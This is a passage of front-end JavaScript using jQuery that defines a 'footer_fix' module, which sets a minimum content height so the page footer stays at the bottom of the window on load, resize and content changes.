    wH = $j(window).height()

    if (page.height() >= wH) return

    fH = footer.outerHeight(true)
    cTop = content.offset().top
    newH = wH - (cTop + fH)

    content.css('min-height', newH)
    hSet = true

    // If there's browser's calculation bias
    err = page.height() - wH
    if (err > 0) {
      content.css('min-height', newH - err)
    }
  }

  function init () {
    set_height()
    $j(window).on('load resize', set_height)
    $j(window).on('contentChanged', set_height) // Catching any event that possibly changes content height
  }

  return {
    init: init,
    set_height: set_height
  }
}

var ft_fix

$j(document).ready(function () {
  ft_fix = new footer_fix()
  ft_fix.init()
})
